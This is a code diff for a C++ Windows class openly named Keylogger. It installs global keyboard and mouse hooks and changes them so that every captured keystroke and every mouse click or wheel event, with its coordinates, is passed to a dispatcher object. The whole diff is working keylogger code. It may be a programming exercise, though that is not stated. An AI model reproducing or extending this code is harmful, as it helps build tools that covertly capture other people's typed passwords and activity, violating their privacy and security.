@@ -2,6 +2,8 @@
 
 extern HHOOK g_hook[2];
 
+Dispatcher Keylogger::_disp;
+
 LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
 {
 	if (code < 0)
@@ -31,18 +33,37 @@ LRESULT CALLBACK Keylogger::handleKey(int code, WPARAM wParam, LPARAM lParam)
 		for (int i = 0; i < size; i++)
 			std::cout << (char)name[i];
 		std::cout << std::endl;
+
+		_disp.dispatch(KeyStroke(std::string((char *)name)));
 	}
 	return CallNextHookEx(g_hook[0], code, wParam, lParam);
 }
 
 LRESULT CALLBACK Keylogger::handleMouse(int code, WPARAM wParam, LPARAM lParam)
 {
-	if (code < 0)
-		return CallNextHookEx(g_hook[1], code, wParam, lParam);
+	if (code == HC_ACTION && lParam)
+	{
+		MOUSEHOOKSTRUCT *param = (MOUSEHOOKSTRUCT *)lParam;
 
-	MOUSEHOOKSTRUCT *param = (MOUSEHOOKSTRUCT *)lParam;
+		if (param->wHitTestCode == HTCLIENT)
+			switch (wParam)
+			{
+				case WM_LBUTTONDOWN:
+					_disp.dispatch(MouseClick(MouseClick::LEFTBUTTON, param->pt.x, param->pt.y));
+					break;
+				case WM_MBUTTONDOWN:
+					_disp.dispatch(MouseClick(MouseClick::MIDDLEBUTTON, param->pt.x, param->pt.y));
+					break;
+				case WM_RBUTTONDOWN:
+					_disp.dispatch(MouseClick(MouseClick::RIGHTBUTTON, param->pt.x, param->pt.y));
+					break;
+				case WM_MOUSEWHEEL:
+					_disp.dispatch(MouseClick(MouseClick::WHEEL, param->pt.x, param->pt.y));
+					break;
 
-//	if (wParam == )
-		std::cout << "Salut" << std::endl;
+				default:
+					break;
+			}
+	}
 	return CallNextHookEx(g_hook[1], code, wParam, lParam);
 }
